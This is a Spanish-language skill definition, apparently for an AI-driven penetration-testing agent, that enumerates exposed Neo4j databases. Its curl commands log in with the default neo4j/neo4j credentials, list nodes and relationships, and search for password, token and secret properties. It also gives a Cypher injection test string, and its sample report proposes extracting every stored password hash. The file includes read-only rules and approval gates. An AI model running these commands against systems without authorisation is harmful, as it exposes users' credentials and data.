---
name: db-neo4j-enum
description: Enumerar bases de datos Neo4j — puertos, browser UI, auth default, Cypher query surface, nodos y relaciones
phase: enum
---

# db-neo4j-enum

## Activation Contract

- **Trigger**: Se detectan puertos 7474 (HTTP browser) o 7687 (Bolt) abiertos con indicios de Neo4j.
- **Target**: IP o hostname con Neo4j expuesto.
- **Dependencies**: `curl`, `python3`, `py2neo`, `neo4j-client`, `nmap`.
- **Expected outcome**: Versión de Neo4j, estado de autenticación, listado de nodos (labels), relaciones, propiedades, detección de Cypher injection.

## Hard Rules

1. NO ejecutar `MATCH (n) DETACH DELETE n` o cualquier query de escritura/borrado.
2. NO intentar crear usuarios o modificar la base de datos.
3. Si el auth default (neo4j/neo4j) funciona, solo hacer queries de lectura.
4. No hacer fuerza bruta contra el endpoint `/db/neo4j/tx/`.
5. Rate limit: 1 request cada 1.5 segundos.
6. Documentar cada label de nodo y tipo de relación encontrado.

## Decision Gates

Usar `question()` antes de:

- Ejecutar queries Cypher contra la base de datos (via REST API o Bolt).
- Acceder a `/db/data/` (API REST interna de Neo4j).
- Subir archivos al browser UI (Neo4j Blob upload).
- Ejecutar queries que puedan ser costosas (`MATCH (n)--()--()--() RETURN n LIMIT 1000`).

## Execution Steps

### Paso 1: Detectar Neo4j y versión
```bash
# Verificar puerto HTTP
curl -s http://<target>:7474/ | head -30

# Verificar headers para versión
curl -sI http://<target>:7474/
```
Buscar `Neo4j-Version` header o el mensaje "Neo4j Browser".

```bash
# Verificar puerto Bolt
nmap -p 7687 -sV --version-intensity 7 <target>
```

### Paso 2: Verificar autenticación
```bash
# Probar auth default vía API REST
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"RETURN 1 AS test"}]}'
```

Si funciona sin credenciales:
```bash
curl -s http://<target>:7474/db/data/
```

### Paso 3: Enumerar labels de nodos
```bash
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"CALL db.labels()"}]}'
```

### Paso 4: Enumerar tipos de relación
```bash
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"CALL db.relationshipTypes()"}]}'
```

### Paso 5: Enumerar property keys
```bash
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"CALL db.propertyKeys()"}]}'
```

### Paso 6: Listar nodos por label (sample)
Para cada label encontrado:
```bash
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"MATCH (n:`<LABEL>`) RETURN n LIMIT 10"}]}'
```

### Paso 7: Buscar nodos con datos sensibles
```bash
# Buscar propiedades que contengan password, secret, key, token
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"MATCH (n) WHERE ANY(k IN keys(n) WHERE toLower(k) CONTAINS \"pass\" OR toLower(k) CONTAINS \"secret\" OR toLower(k) CONTAINS \"token\" OR toLower(k) CONTAINS \"key\") RETURN n"}]}'
```

### Paso 8: Verificar browser UI y schema
```bash
# Browser UI
curl -s http://<target>:7474/browser/ | head -5

# Schema overview
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"CALL db.schema.visualization()"}]}'
```

### Paso 9: Detectar Cypher injection (si hay app web)
Buscar endpoints que reflejen queries o errores de Cypher en la app adjunta.
Test básico:
```
' OR 1=1 WITH 1 AS x MATCH (n) RETURN n LIMIT 1 //
```

### Paso 10: Verificar plugins (APOC, GDS, Bloom)
```bash
curl -s -u neo4j:neo4j http://<target>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"CALL dbms.listProcedures() YIELD name WHERE name STARTS WITH \"apoc\" OR name STARTS WITH \"gds\" RETURN count(name)"}]}'
```

## Output Contract

```json
{
  "phase": "enum",
  "skill": "db-neo4j-enum",
  "target": "<target>",
  "open_ports": [
    {"port": 7474, "protocol": "HTTP", "version": "Neo4j 5.15.0", "banner": "Neo4j Browser"},
    {"port": 7687, "protocol": "Bolt", "version": "Neo4j 5.15.0 (Bolt 5.4)", "banner": ""}
  ],
  "auth_required": true,
  "default_creds_work": true,
  "labels": ["User", "Product", "Order", "Payment", "Session"],
  "relationship_types": ["OWNS", "PURCHASED", "CONTAINS", "PAID_WITH"],
  "property_keys": ["name", "email", "password_hash", "credit_card_last4", "role", "created_at"],
  "node_counts": {
    "User": 1250,
    "Product": 3400,
    "Order": 8900,
    "Payment": 8900,
    "Session": 450
  },
  "sensitive_properties_found": [
    {"label": "User", "property": "password_hash"},
    {"label": "Payment", "property": "credit_card_last4"}
  ],
  "plugins": {"APOC": true, "GDS": false, "Bloom": false},
  "findings": [
    {
      "title": "Neo4j con credenciales default neo4j/neo4j activas",
      "severity": "critical",
      "category": "default-credentials",
      "cvss": 9.1,
      "cwe": "CWE-798",
      "evidence": "Cypher query vía REST API con neo4j/neo4j retornó datos de Users, Products, Orders, Payments. Password hash expuesto en User nodes.",
      "remediation": "Cambiar password de neo4j y habilitar autenticación fuerte. No almacenar hashes ni datos de pago en Neo4j.",
      "next_steps": ["Extraer todos los nodos User con password_hash", "Verificar si credit_card_last4 cumple PCI DSS"]
    }
  ],
  "summary": "Neo4j 5.15.0 con auth default funcional, 5 labels, 8900 transacciones, password_hash expuesto, APOC disponible",
  "next_phase": "exploit",
  "recommended_skills": ["hunt-sqli", "hunt-api-abuse", "hunt-insecure-deserialization-node"]
}
```
